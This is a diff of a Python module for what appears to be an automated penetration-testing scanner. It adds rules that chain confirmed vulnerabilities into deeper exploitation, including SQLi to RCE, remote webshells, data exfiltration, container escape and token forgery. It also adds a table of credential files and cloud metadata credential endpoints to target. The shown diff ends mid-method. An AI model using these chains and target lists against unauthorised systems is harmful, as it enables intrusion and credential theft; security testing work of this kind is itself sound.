@@ -1,5 +1,19 @@
 """
-Vulnerability Chain Engine - Enterprise Edition
+Vulnerability Chain Engine - Scanning Phase (Enterprise Edition)
+=================================================================
+
+PURPOSE: Exploits HIGH/CRITICAL findings for maximum impact.
+Used in the SCANNING phase (Phase 4.3) of the pipeline.
+
+This is DISTINCT from `analysis/vuln_chain_engine.py` which handles LOW→HIGH
+upgrades during the ANALYSIS phase.
+
++-------------------------------------------------------------------+
+| Component                    | Purpose                            |
+|------------------------------|-------------------------------------|
+| analysis/vuln_chain_engine   | LOW→HIGH (prove exploitability)    |
+| scanning/vuln_chain_engine   | HIGH→CRITICAL (deep exploitation)  |
++-------------------------------------------------------------------+
 
 Implements intelligent vulnerability chaining:
 - SQLi → RCE (via UDF, COPY TO PROGRAM, xp_cmdshell)
@@ -21,23 +35,49 @@ Usage:
 
     # Process a finding and get chain results
     chain_findings = await engine.process_finding(sqli_finding)
+
+For LOW→HIGH chaining (Missing CSP→XSS, Clickjacking, etc.):
+    from analysis.vuln_chain_engine import VulnChainEngine
 """
 
 from dataclasses import dataclass, field
 from enum import Enum, auto
 from typing import Any, Callable, Dict, List, Optional, Set
 import asyncio
-import logging
 import os
-import re
-from urllib.parse import urljoin, urlparse
+import time
+from urllib.parse import urlparse
 
 import httpx
 
+from scanning.constants import normalize_vuln_type
 from utils.logger import get_logger
-from utils.shared_findings_store import SharedFindingsStore, VulnType
+from utils.rate_limiter import RateLimiter
+from utils.shared_findings_store import SharedFindingsStore, VulnType, get_shared_findings
 
 logger = get_logger(__name__)
+
+# L10 FIX 2026-02-12: Export public API
+__all__ = [
+    # Core classes
+    "VulnerabilityChainEngine",
+    "ChainTrigger",
+    "ChainPriority",
+    "ChainRule",
+    "ChainResult",
+    "ChainErrorType",
+    # Constants
+    "CHAIN_LIMITS",
+    "CHAIN_TESTING_LIMITS",
+    "OS_SENSITIVE_PATHS",
+    "CONFIDENCE_STANDARDS",
+    "MAX_CHAIN_DEPTH",
+    # Helper functions
+    "is_chain_testing_allowed",
+    "is_speculative_allowed",
+    "get_sensitive_paths",
+    "get_chain_confidence",
+]
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # SAFETY MODE CONFIGURATION
@@ -87,6 +127,109 @@ def is_speculative_allowed() -> bool:
     return CHAIN_LIMITS.get("allow_speculative", True)
 
 
+# ═══════════════════════════════════════════════════════════════════════════════
+# M1 FIX 2026-02-12: OS-AWARE FILE PATHS
+# Handlers should use these instead of hardcoded /etc/passwd or C:\boot.ini
+# ═══════════════════════════════════════════════════════════════════════════════
+OS_SENSITIVE_PATHS = {
+    "linux": {
+        "passwd": "/etc/passwd",
+        "shadow": "/etc/shadow",
+        "hosts": "/etc/hosts",
+        "ssh_keys": ["~/.ssh/id_rsa", "~/.ssh/authorized_keys", "/root/.ssh/id_rsa"],
+        "web_config": ["/var/www/.env", "/var/www/html/.env", "/var/www/config.php"],
+        "db_config": ["/etc/mysql/my.cnf", "/var/lib/pgsql/data/pg_hba.conf"],
+        "logs": ["/var/log/apache2/access.log", "/var/log/nginx/access.log"],
+        "proc": ["/proc/self/environ", "/proc/self/cmdline"],
+    },
+    "windows": {
+        "passwd": None,  # Windows doesn't have /etc/passwd
+        "shadow": None,
+        "hosts": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "ssh_keys": [],  # Typically not present on Windows
+        "web_config": ["C:\\inetpub\\wwwroot\\web.config", "C:\\xampp\\htdocs\\.env"],
+        "db_config": ["C:\\ProgramData\\MySQL\\MySQL Server 8.0\\my.ini"],
+        "logs": ["C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log"],
+        "proc": [],  # Windows uses different mechanisms
+        "boot_ini": "C:\\boot.ini",  # Legacy Windows
+        "sam": "C:\\Windows\\System32\\config\\SAM",  # User database
+    },
+    "cloud": {
+        # Cloud metadata endpoints (platform-agnostic)
+        "aws_metadata": "http://169.254.169.254/latest/meta-data/",
+        "aws_credentials": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "aws_userdata": "http://169.254.169.254/latest/user-data",
+        "azure_metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "azure_token": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
+        "gcp_metadata": "http://metadata.google.internal/computeMetadata/v1/",
+    },
+}
+
+
+def get_sensitive_paths(os_type: str = "linux") -> Dict[str, Any]:
+    """
+    M1 FIX: Get OS-appropriate sensitive file paths.
+
+    Args:
+        os_type: "linux", "windows", or "cloud"
+
+    Returns:
+        Dictionary of path categories to actual paths
+    """
+    return OS_SENSITIVE_PATHS.get(os_type, OS_SENSITIVE_PATHS["linux"])
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# M2 FIX 2026-02-12: CONFIDENCE STANDARDS
+# Document what confidence values mean in chain context
+# ═══════════════════════════════════════════════════════════════════════════════
+CONFIDENCE_STANDARDS = {
+    95: "PROVEN - Chain fully exploited with data extraction/state change",
+    90: "VERY_LIKELY - Chain verified with direct evidence, minimal uncertainty",
+    85: "LIKELY - Strong indicators of chain success (e.g., SQLi confirmed, RCE payload echoed)",
+    80: "PROBABLE - High confidence based on vulnerability type + technology match",
+    75: "POSSIBLE - Chain logic valid but not directly verified",
+    70: "MODERATE - Reasonable chain but some conditions uncertain",
+    65: "SPECULATIVE - Chain suggested based on patterns, needs manual verification",
+    60: "WEAK - Chain possible but significant uncertainty (e.g., WAF might block)",
+    50: "THEORETICAL - Chain described for completeness, unlikely to work as-is",
+}
+
+
+def get_chain_confidence(
+    vuln_confirmed: bool,
+    chain_verified: bool,
+    data_extracted: bool = False,
+) -> int:
+    """
+    M2 FIX: Calculate appropriate confidence for chain finding.
+
+    Args:
+        vuln_confirmed: Is the source vulnerability confirmed?
+        chain_verified: Was the chain action actually tested?
+        data_extracted: Did we extract actual data/achieve impact?
+
+    Returns:
+        Confidence value (50-95)
+    """
+    if data_extracted:
+        return 95
+    if chain_verified and vuln_confirmed:
+        return 90
+    if vuln_confirmed:
+        return 80
+    if chain_verified:
+        return 75
+    return 65  # Speculative
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# M4 FIX 2026-02-12: CHAIN DEPTH LIMIT
+# Prevent infinite recursion: Chain A → Chain B → Chain C → ...
+# ═══════════════════════════════════════════════════════════════════════════════
+MAX_CHAIN_DEPTH = 3  # Default max depth for recursive chain processing
+
+
 class ChainTrigger(Enum):
     """Vulnerability types that can trigger chains."""
     SQLI_CONFIRMED = auto()
@@ -125,6 +268,7 @@ class ChainTrigger(Enum):
     NOSQL_INJECTION = auto()        # NoSQL injection confirmed
     SESSION_WEAKNESS = auto()       # Session/token abuse confirmed
     BUSINESS_LOGIC = auto()         # Business logic flaw confirmed
+    CSRF_CONFIRMED = auto()         # CSRF vulnerability confirmed
     # SPECULATIVE TRIGGERS (based on technology, not confirmed vulns)
     SPECULATIVE_AWS = auto()        # AWS detected, suggest attack paths
     SPECULATIVE_API = auto()        # API detected, suggest attack paths
@@ -139,6 +283,18 @@ class ChainTrigger(Enum):
     VERIFY_RATE_LIMIT = auto()      # Rate limit bypass on verification
     AUTH_NULL_INJECTION = auto()    # CVE-2020-24655 pattern - null injection bypass
     SPECULATIVE_COMMS = auto()      # Communications platform detected
+    # ═══════════════════════════════════════════════════════════════════
+    # INFRASTRUCTURE TRIGGERS (network, container, CI/CD)
+    # ═══════════════════════════════════════════════════════════════════
+    HTTP_SMUGGLING = auto()         # Request smuggling confirmed
+    CONTAINER_EXPOSURE = auto()     # Docker/K8s exposure
+    FILE_UPLOAD = auto()            # Unrestricted file upload
+    GIT_EXPOSURE = auto()           # Git/source code exposure
+    CICD_EXPOSURE = auto()          # CI/CD pipeline exposure
+    SUBDOMAIN_TAKEOVER = auto()     # Subdomain takeover
+    PROTOTYPE_POLLUTION = auto()    # JS prototype pollution
+    WEBSOCKET_HIJACK = auto()       # WebSocket hijacking
+    PADDING_ORACLE = auto()         # Cryptographic oracle attack
 
 
 class ChainPriority(Enum):
@@ -162,6 +318,17 @@ class ChainRule:
     timeout: int = 60  # seconds
 
 
+class ChainErrorType(Enum):
+    """H6 FIX: Error types for retry classification."""
+    NONE = auto()           # No error
+    TIMEOUT = auto()        # Timed out - retryable with longer timeout
+    CONNECTION = auto()     # Connection failed - retryable after backoff
+    RATE_LIMITED = auto()   # Rate limited - retryable after longer backoff
+    BUDGET_EXHAUSTED = auto()  # Budget exhausted - not retryable
+    HANDLER_ERROR = auto()  # Handler bug - not retryable
+    UNKNOWN = auto()        # Unknown error - maybe retryable
+
+
 @dataclass
 class ChainResult:
     """Result of executing a chain action."""
@@ -171,6 +338,9 @@ class ChainResult:
     evidence: Dict[str, Any]
     error: Optional[str] = None
     execution_time: float = 0.0
+    # H6 FIX 2026-02-12: Error classification for retry logic
+    error_type: ChainErrorType = ChainErrorType.NONE
+    retryable: bool = False
 
 
 class VulnerabilityChainEngine:
@@ -248,10 +418,41 @@ class VulnerabilityChainEngine:
         "session_fixation": ChainTrigger.SESSION_FIXATION,
         "token_not_invalidated": ChainTrigger.SESSION_WEAKNESS,
 
-        # Business logic
+        # ═══════════════════════════════════════════════════════════════════
+        # BUSINESS LOGIC — Detailed subtypes for chain detection
+        # ═══════════════════════════════════════════════════════════════════
         "business_logic": ChainTrigger.BUSINESS_LOGIC,
+
+        # Price/Quantity manipulation (CRITICAL — direct financial impact)
         "price_manipulation": ChainTrigger.BUSINESS_LOGIC,
+        "negative_quantity": ChainTrigger.BUSINESS_LOGIC,
+        "negative_value": ChainTrigger.BUSINESS_LOGIC,
+        "quantity_manipulation": ChainTrigger.BUSINESS_LOGIC,
+        "zero_price": ChainTrigger.BUSINESS_LOGIC,
+
+        # Workflow/Verification bypass (HIGH — skips security steps)
         "workflow_bypass": ChainTrigger.BUSINESS_LOGIC,
+        "checkout_bypass": ChainTrigger.BUSINESS_LOGIC,
+        "verification_bypass": ChainTrigger.BUSINESS_LOGIC,
+        "state_machine_bypass": ChainTrigger.BUSINESS_LOGIC,
+
+        # Coupon/Discount abuse (MEDIUM-HIGH — revenue impact)
+        "coupon_reuse": ChainTrigger.BUSINESS_LOGIC,
+        "coupon_abuse": ChainTrigger.BUSINESS_LOGIC,
+        "discount_abuse": ChainTrigger.BUSINESS_LOGIC,
+
+        # Race conditions (HIGH — timing-based exploitation)
+        "race_condition": ChainTrigger.BUSINESS_LOGIC,
+        "toctou": ChainTrigger.BUSINESS_LOGIC,
+        "double_spend": ChainTrigger.BUSINESS_LOGIC,
+
+        # Inventory manipulation (HIGH — stock/reservation abuse)
+        "inventory_manipulation": ChainTrigger.BUSINESS_LOGIC,
+        "stock_manipulation": ChainTrigger.BUSINESS_LOGIC,
+
+        # Rate limit bypass (MEDIUM — enables other attacks)
+        "rate_limit_bypass": ChainTrigger.BUSINESS_LOGIC,
+        "missing_rate_limit": ChainTrigger.BUSINESS_LOGIC,
 
         # Information disclosure
         "information_disclosure": ChainTrigger.INFO_DISCLOSURE,
@@ -280,6 +481,15 @@ class VulnerabilityChainEngine:
         "cache_poisoning": ChainTrigger.CACHE_POISONING,
         "web_cache": ChainTrigger.CACHE_POISONING,
 
+        # Weak cryptography
+        "weak_crypto": ChainTrigger.WEAK_CRYPTO,
+        "weak_cipher": ChainTrigger.WEAK_CRYPTO,
+        "weak_encryption": ChainTrigger.WEAK_CRYPTO,
+        "insecure_crypto": ChainTrigger.WEAK_CRYPTO,
+        "weak_hash": ChainTrigger.WEAK_CRYPTO,
+        "md5_hash": ChainTrigger.WEAK_CRYPTO,
+        "sha1_hash": ChainTrigger.WEAK_CRYPTO,
+
         # ═══════════════════════════════════════════════════════════════════
         # COMMUNICATIONS API MAPPINGS (Twilio, SendGrid, Authy)
         # ═══════════════════════════════════════════════════════════════════
@@ -299,6 +509,66 @@ class VulnerabilityChainEngine:
         "otp_brute_force": ChainTrigger.VERIFY_RATE_LIMIT,
         "auth_null_injection": ChainTrigger.AUTH_NULL_INJECTION,
         "authentication_bypass": ChainTrigger.AUTH_NULL_INJECTION,
+
+        # ═══════════════════════════════════════════════════════════════════
+        # INFRASTRUCTURE MAPPINGS (network, container, CI/CD)
+        # ═══════════════════════════════════════════════════════════════════
+        # HTTP Request Smuggling
+        "http_smuggling": ChainTrigger.HTTP_SMUGGLING,
+        "request_smuggling": ChainTrigger.HTTP_SMUGGLING,
+        "cl_te": ChainTrigger.HTTP_SMUGGLING,
+        "te_cl": ChainTrigger.HTTP_SMUGGLING,
+
+        # Container/Kubernetes
+        "kubernetes": ChainTrigger.CONTAINER_EXPOSURE,
+        "k8s_dashboard": ChainTrigger.CONTAINER_EXPOSURE,
+        "container_exposure": ChainTrigger.CONTAINER_EXPOSURE,
+        "container_escape": ChainTrigger.CONTAINER_EXPOSURE,
+        "docker_registry": ChainTrigger.CONTAINER_EXPOSURE,
+        "container_registry": ChainTrigger.CONTAINER_EXPOSURE,
+
+        # File Upload
+        "file_upload": ChainTrigger.FILE_UPLOAD,
+        "unrestricted_upload": ChainTrigger.FILE_UPLOAD,
+        "arbitrary_file_upload": ChainTrigger.FILE_UPLOAD,
+
+        # Git/Source Exposure
+        "git_exposure": ChainTrigger.GIT_EXPOSURE,
+        "source_exposure": ChainTrigger.GIT_EXPOSURE,
+        ".git": ChainTrigger.GIT_EXPOSURE,
+        "svn_exposure": ChainTrigger.GIT_EXPOSURE,
+
+        # CI/CD Pipeline
+        "ci_exposure": ChainTrigger.CICD_EXPOSURE,
+        "jenkins": ChainTrigger.CICD_EXPOSURE,
+        "github_actions": ChainTrigger.CICD_EXPOSURE,
+        "gitlab_ci": ChainTrigger.CICD_EXPOSURE,
+        "pipeline_exposure": ChainTrigger.CICD_EXPOSURE,
+
+        # Subdomain Takeover
+        "subdomain_takeover": ChainTrigger.SUBDOMAIN_TAKEOVER,
+        "dangling_dns": ChainTrigger.SUBDOMAIN_TAKEOVER,
+        "cname_vulnerability": ChainTrigger.SUBDOMAIN_TAKEOVER,
+
+        # JavaScript Attacks
+        "prototype_pollution": ChainTrigger.PROTOTYPE_POLLUTION,
+        "javascript_injection": ChainTrigger.PROTOTYPE_POLLUTION,
+
+        # WebSocket
+        "websocket": ChainTrigger.WEBSOCKET_HIJACK,
+        "ws_hijacking": ChainTrigger.WEBSOCKET_HIJACK,
+        "websocket_hijack": ChainTrigger.WEBSOCKET_HIJACK,
+
+        # Cryptographic Attacks
+        "padding_oracle": ChainTrigger.PADDING_ORACLE,
+        "crypto_weakness": ChainTrigger.PADDING_ORACLE,
+        "oracle_attack": ChainTrigger.PADDING_ORACLE,
+
+        # CSRF — Cross-Site Request Forgery
+        "csrf": ChainTrigger.CSRF_CONFIRMED,
+        "cross_site_request_forgery": ChainTrigger.CSRF_CONFIRMED,
+        "missing_csrf_token": ChainTrigger.CSRF_CONFIRMED,
+        "csrf_bypass": ChainTrigger.CSRF_CONFIRMED,
     }
 
     # Chain rules defining what actions to take for each trigger
@@ -367,7 +637,7 @@ class VulnerabilityChainEngine:
             action="lfi_php_wrappers",
             priority=ChainPriority.CRITICAL,
             description="LFI + PHP → php://filter source code extraction",
-            condition=lambda ctx: "php" in ctx.get("technologies", []),
+            condition=lambda ctx: "php" in (ctx.get("technologies") or []),
             required_context={"technologies"},
         ),
         ChainRule(
@@ -375,7 +645,7 @@ class VulnerabilityChainEngine:
             action="lfi_log_poisoning",
             priority=ChainPriority.CRITICAL,
             description="LFI → Log poisoning for RCE",
-            condition=lambda ctx: "php" in ctx.get("technologies", []) or "apache" in ctx.get("technologies", []),
+            condition=lambda ctx: "php" in (ctx.get("technologies") or []) or "apache" in (ctx.get("technologies") or []),
         ),
         ChainRule(
             trigger=ChainTrigger.LFI_CONFIRMED,
@@ -445,12 +715,14 @@ class VulnerabilityChainEngine:
             description="SSRF → AWS/GCP/Azure metadata extraction",
             condition=None,
         ),
+        # H5 FIX 2026-02-12: Port scan needs longer timeout
         ChainRule(
             trigger=ChainTrigger.SSRF_CONFIRMED,
             action="ssrf_internal_port_scan",
             priority=ChainPriority.HIGH,
             description="SSRF → Internal network port scan",
             condition=None,
+            timeout=120,  # H5 FIX: 2 minutes for port scanning
         ),
         ChainRule(
             trigger=ChainTrigger.SSRF_CONFIRMED,
@@ -493,7 +765,7 @@ class VulnerabilityChainEngine:
             action="deser_java_gadget",
             priority=ChainPriority.CRITICAL,
             description="Java deserialization → ysoserial gadget chain RCE",
-            condition=lambda ctx: "java" in ctx.get("technologies", []),
+            condition=lambda ctx: "java" in (ctx.get("technologies") or []),
             required_context={"technologies"},
         ),
         ChainRule(
@@ -501,7 +773,7 @@ class VulnerabilityChainEngine:
             action="deser_php_gadget",
             priority=ChainPriority.CRITICAL,
             description="PHP deserialization → Object injection RCE",
-            condition=lambda ctx: "php" in ctx.get("technologies", []),
+            condition=lambda ctx: "php" in (ctx.get("technologies") or []),
             required_context={"technologies"},
         ),
         ChainRule(
@@ -509,7 +781,7 @@ class VulnerabilityChainEngine:
             action="deser_python_pickle",
             priority=ChainPriority.CRITICAL,
             description="Python pickle → RCE",
-            condition=lambda ctx: "python" in ctx.get("technologies", []),
+            condition=lambda ctx: "python" in (ctx.get("technologies") or []),
             required_context={"technologies"},
         ),
         ChainRule(
@@ -517,7 +789,7 @@ class VulnerabilityChainEngine:
             action="deser_dotnet_gadget",
             priority=ChainPriority.CRITICAL,
             description=".NET deserialization → ysoserial.net RCE",
-            condition=lambda ctx: any(t in ctx.get("technologies", []) for t in ["asp.net", ".net", "csharp"]),
+            condition=lambda ctx: any(t in (ctx.get("technologies") or []) for t in ["asp.net", ".net", "csharp"]),
             required_context={"technologies"},
         ),
 
@@ -633,7 +905,7 @@ class VulnerabilityChainEngine:
             action="redirect_oauth_theft",
             priority=ChainPriority.HIGH,
             description="Open redirect → OAuth token theft chain",
-            condition=lambda ctx: any(t in ctx.get("technologies", []) for t in ["oauth", "oauth2", "oidc"]),
+            condition=lambda ctx: any(t in (ctx.get("technologies") or []) for t in ["oauth", "oauth2", "oidc"]),
         ),
         ChainRule(
             trigger=ChainTrigger.OPEN_REDIRECT,
@@ -676,7 +948,7 @@ class VulnerabilityChainEngine:
             action="cloudfront_origin_access",
             priority=ChainPriority.CRITICAL,
             description="CloudFront bypass → Direct origin access",
-            condition=lambda ctx: "cloudfront" in str(ctx.get("technologies", [])).lower(),
+            condition=lambda ctx: "cloudfront" in str((ctx.get("technologies") or [])).lower(),
         ),
         ChainRule(
             trigger=ChainTrigger.S3_MISCONFIGURATION,
@@ -690,7 +962,7 @@ class VulnerabilityChainEngine:
             action="ssrf_aws_imds_v2",
             priority=ChainPriority.CRITICAL,
             description="SSRF → AWS IMDSv2 token theft",
-            condition=lambda ctx: any("aws" in str(t).lower() for t in ctx.get("technologies", [])),
+            condition=lambda ctx: any("aws" in str(t).lower() for t in (ctx.get("technologies") or [])),
         ),
         ChainRule(
             trigger=ChainTrigger.CLOUD_METADATA,
@@ -744,7 +1016,7 @@ class VulnerabilityChainEngine:
             action="cache_stored_xss",
             priority=ChainPriority.CRITICAL,
             description="Cache poisoning → Persistent XSS via CDN cache",
-            condition=lambda ctx: any("cloudfront" in str(t).lower() for t in ctx.get("technologies", [])),
+            condition=lambda ctx: any("cloudfront" in str(t).lower() for t in (ctx.get("technologies") or [])),
         ),
         ChainRule(
             trigger=ChainTrigger.CACHE_POISONING,
@@ -763,7 +1035,7 @@ class VulnerabilityChainEngine:
             action="speculative_aws_attack_paths",
             priority=ChainPriority.MEDIUM,
             description="AWS detected → Suggest cloud-specific attack paths",
-            condition=lambda ctx: any("aws" in str(t).lower() for t in ctx.get("technologies", [])),
+            condition=lambda ctx: any("aws" in str(t).lower() for t in (ctx.get("technologies") or [])),
         ),
         ChainRule(
             trigger=ChainTrigger.SPECULATIVE_API,
@@ -829,6 +1101,249 @@ class VulnerabilityChainEngine:
                 for d in ["twilio", "sendgrid", "authy", "segment"]
             ),
         ),
+
+        # ============================================
+        # ORPHAN TRIGGER RULES (previously missing)
+        # ============================================
+        ChainRule(
+            trigger=ChainTrigger.PATH_TRAVERSAL,
+            action="path_traversal_config_extraction",
+            priority=ChainPriority.HIGH,
+            description="Path traversal → Extract configuration files",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.PATH_TRAVERSAL,
+            action="path_traversal_source_code",
+            priority=ChainPriority.MEDIUM,
+            description="Path traversal → Read application source code",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.WEAK_CRYPTO,
+            action="weak_crypto_token_forge",
+            priority=ChainPriority.HIGH,
+            description="Weak cryptography → Forge tokens or decrypt sensitive data",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.SESSION_FIXATION,
+            action="session_fixation_ato",
+            priority=ChainPriority.HIGH,
+            description="Session fixation → Account takeover via forced session",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.RFI_CONFIRMED,
+            action="rfi_remote_shell",
+            priority=ChainPriority.CRITICAL,
+            description="RFI → Include remote webshell for RCE",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.RFI_CONFIRMED,
+            action="rfi_data_exfiltration",
+            priority=ChainPriority.HIGH,
+            description="RFI → Exfiltrate data to attacker-controlled server",
+            condition=None,
+        ),
+        # H5 FIX 2026-02-12: Blind SQLi needs longer timeout (time-based extraction)
+        ChainRule(
+            trigger=ChainTrigger.SQLI_BLIND_CONFIRMED,
+            action="sqli_blind_data_extraction",
+            priority=ChainPriority.HIGH,
+            description="Blind SQLi → Boolean-based/time-based data extraction",
+            condition=None,
+            timeout=180,  # H5 FIX: 3 minutes for time-based extraction
+        ),
+        ChainRule(
+            trigger=ChainTrigger.SQLI_BLIND_CONFIRMED,
+            action="sqli_blind_file_read",
+            priority=ChainPriority.MEDIUM,
+            description="Blind SQLi → Conditional file read via inference",
+            condition=None,
+            timeout=180,  # H5 FIX: 3 minutes for time-based file read
+        ),
+        ChainRule(
+            trigger=ChainTrigger.S3_MISCONFIGURATION,
+            action="s3_data_enumeration",
+            priority=ChainPriority.HIGH,
+            description="S3 misconfiguration → List and download bucket contents",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.S3_MISCONFIGURATION,
+            action="s3_write_check",
+            priority=ChainPriority.CRITICAL,
+            description="S3 misconfiguration → Check for write access",
+            condition=None,
+        ),
+
+        # ════════════════════════════════════════════════════════════════════
+        # H2 FIX 2026-02-12: ORPHAN TRIGGER RULES (previously missing)
+        # ════════════════════════════════════════════════════════════════════
+
+        # CSRF → State-changing actions
+        ChainRule(
+            trigger=ChainTrigger.CSRF_CONFIRMED,
+            action="csrf_admin_action",
+            priority=ChainPriority.HIGH,
+            description="CSRF → Admin state change (password reset, role change)",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.CSRF_CONFIRMED,
+            action="csrf_account_takeover",
+            priority=ChainPriority.CRITICAL,
+            description="CSRF → Account takeover via email/password change",
+            condition=None,
+        ),
+
+        # HTTP Smuggling → Cache poisoning, request hijacking
+        ChainRule(
+            trigger=ChainTrigger.HTTP_SMUGGLING,
+            action="smuggling_cache_poison",
+            priority=ChainPriority.CRITICAL,
+            description="HTTP Smuggling → Cache poisoning attack",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.HTTP_SMUGGLING,
+            action="smuggling_request_hijack",
+            priority=ChainPriority.HIGH,
+            description="HTTP Smuggling → Request hijacking/credential theft",
+            condition=None,
+        ),
+
+        # Container Exposure → Escape, host access
+        ChainRule(
+            trigger=ChainTrigger.CONTAINER_EXPOSURE,
+            action="container_escape",
+            priority=ChainPriority.CRITICAL,
+            description="Container Exposure → Container escape to host",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.CONTAINER_EXPOSURE,
+            action="container_secret_extraction",
+            priority=ChainPriority.HIGH,
+            description="Container Exposure → Extract secrets from environment",
+            condition=None,
+        ),
+
+        # File Upload → Webshell, XSS
+        ChainRule(
+            trigger=ChainTrigger.FILE_UPLOAD,
+            action="upload_webshell",
+            priority=ChainPriority.CRITICAL,
+            description="Unrestricted File Upload → Web shell RCE",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.FILE_UPLOAD,
+            action="upload_xss",
+            priority=ChainPriority.HIGH,
+            description="File Upload → Stored XSS via uploaded content",
+            condition=None,
+        ),
+
+        # Git Exposure → Credential extraction, source analysis
+        ChainRule(
+            trigger=ChainTrigger.GIT_EXPOSURE,
+            action="git_credential_extraction",
+            priority=ChainPriority.CRITICAL,
+            description="Git Exposure → Extract credentials from .git history",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.GIT_EXPOSURE,
+            action="git_source_analysis",
+            priority=ChainPriority.HIGH,
+            description="Git Exposure → Analyze source for vulnerabilities",
+            condition=None,
+        ),
+
+        # CI/CD Exposure → Pipeline injection, supply chain
+        ChainRule(
+            trigger=ChainTrigger.CICD_EXPOSURE,
+            action="cicd_pipeline_injection",
+            priority=ChainPriority.CRITICAL,
+            description="CI/CD Exposure → Pipeline injection for RCE",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.CICD_EXPOSURE,
+            action="cicd_secret_extraction",
+            priority=ChainPriority.HIGH,
+            description="CI/CD Exposure → Extract secrets from pipeline config",
+            condition=None,
+        ),
+
+        # Subdomain Takeover → Phishing, cookie theft
+        ChainRule(
+            trigger=ChainTrigger.SUBDOMAIN_TAKEOVER,
+            action="takeover_cookie_theft",
+            priority=ChainPriority.CRITICAL,
+            description="Subdomain Takeover → Steal cookies via scope overlap",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.SUBDOMAIN_TAKEOVER,
+            action="takeover_phishing",
+            priority=ChainPriority.HIGH,
+            description="Subdomain Takeover → Phishing on trusted domain",
+            condition=None,
+        ),
+
+        # Prototype Pollution → XSS, DoS
+        ChainRule(
+            trigger=ChainTrigger.PROTOTYPE_POLLUTION,
+            action="pp_xss_escalation",
+            priority=ChainPriority.HIGH,
+            description="Prototype Pollution → XSS via polluted properties",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.PROTOTYPE_POLLUTION,
+            action="pp_auth_bypass",
+            priority=ChainPriority.CRITICAL,
+            description="Prototype Pollution → Authentication bypass",
+            condition=None,
+        ),
+
+        # WebSocket Hijack → Session hijack, data injection
+        ChainRule(
+            trigger=ChainTrigger.WEBSOCKET_HIJACK,
+            action="ws_session_hijack",
+            priority=ChainPriority.HIGH,
+            description="WebSocket Hijack → Session hijacking",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.WEBSOCKET_HIJACK,
+            action="ws_data_injection",
+            priority=ChainPriority.HIGH,
+            description="WebSocket Hijack → Inject malicious data",
+            condition=None,
+        ),
+
+        # Padding Oracle → Token forgery, data decryption
+        ChainRule(
+            trigger=ChainTrigger.PADDING_ORACLE,
+            action="oracle_token_forge",
+            priority=ChainPriority.CRITICAL,
+            description="Padding Oracle → Forge authentication tokens",
+            condition=None,
+            timeout=300,  # H5 FIX: Oracle attacks take time
+        ),
+        ChainRule(
+            trigger=ChainTrigger.PADDING_ORACLE,
+            action="oracle_decrypt",
+            priority=ChainPriority.HIGH,
+            description="Padding Oracle → Decrypt sensitive data",
+            condition=None,
+            timeout=300,  # H5 FIX: Oracle attacks take time
+        ),
     ]
 
     def __init__(self, settings: Optional[Any] = None):
@@ -840,9 +1355,144 @@ class VulnerabilityChainEngine:
         self.http_client: Optional[httpx.AsyncClient] = None
         self.timeout = httpx.Timeout(30.0)
 
+        # Prevent same chain action from firing multiple times
+        # (e.g., 5 CSTI findings each triggering xss_token_theft_chain)
+        self._chain_actions_completed: Set[str] = set()
+
+        # M5 FIX 2026-02-12: Chain execution metrics
+        # Comprehensive metrics for reporting and debugging
+        self._metrics = {
+            "findings_processed": 0,
+            "chains_executed": 0,
+            "chains_successful": 0,
+            "chains_failed": 0,
+            "chains_skipped_budget": 0,
+            "chains_skipped_depth": 0,
+            "total_chain_findings": 0,
+            "escalations_attempted": 0,
+            "requests_made": 0,
+            "execution_time_total": 0.0,
+            "by_trigger": {},  # Count per trigger type
+            "by_action": {},   # Count per action
+        }
+
+        # Legacy metric (kept for backwards compatibility)
+        self.escalations_attempted = 0
+
+        # M4 FIX 2026-02-12: Chain depth limit
+        # Prevents infinite recursion when chains trigger other chains
+        self.max_chain_depth = MAX_CHAIN_DEPTH
+        self._current_depth = 0
+
+        # C1 FIX 2026-02-12: Rate limiter integration
+        # Chain handlers must respect rate limits to avoid DoS/WAF blocks
+        self._rate_limiter: Optional[RateLimiter] = None
+
+        # C2 FIX 2026-02-12: Chain request budget tracking
+        # Tracks requests made per chain action to enforce CHAIN_LIMITS.max_requests_per_chain
+        self._current_chain_requests: int = 0
+        self._current_chain_action: str = ""
+
+        # C3 FIX 2026-02-12: SharedFindingsStore for cross-module awareness
+        # Chain findings are shared so other modules can use them
+        self._shared_store: Optional[SharedFindingsStore] = None
+
         # Action handlers (will be loaded from chain_actions/)
         self._action_handlers: Dict[str, Callable] = {}
         self._load_action_handlers()
+
+    def reset(self) -> None:
+        """
+        Reset engine state for a new scan.
+
+        MUST be called at the start of each scan to prevent:
+        - Context accumulation across scans (xss_endpoints, sqli_endpoints, etc.)
+        - Duplicate chain prevention leaking between scans (_chain_actions_completed)
+        - Stale findings_processed blocking new findings
+        """
+        self.context.clear()
+        self.findings_processed.clear()
+        self.chain_results.clear()
+        self._chain_actions_completed.clear()
+        self.escalations_attempted = 0
+        # C2 FIX: Reset budget tracking
+        self._current_chain_requests = 0
+        self._current_chain_action = ""
+        # M4 FIX: Reset depth tracking
+        self._current_depth = 0
+        # M5 FIX: Reset metrics
+        self._metrics = {
+            "findings_processed": 0,
